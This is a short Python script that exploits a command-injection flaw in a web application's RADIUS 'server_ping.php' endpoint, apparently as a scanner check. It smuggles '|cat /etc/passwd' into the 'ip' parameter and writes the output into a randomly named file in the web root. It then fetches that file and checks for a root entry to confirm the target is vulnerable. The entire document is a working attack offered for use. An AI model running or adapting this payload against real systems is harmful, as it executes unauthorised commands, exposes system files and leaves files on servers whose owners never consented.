import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
rand=randomLowercase(7)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../"+str(rand)+".txt&id=1"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("parent.doTestResult",response.text):
		r0=True
	else:
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+""+rand+".txt"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("root:[x*]:0:0:",response.text):
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
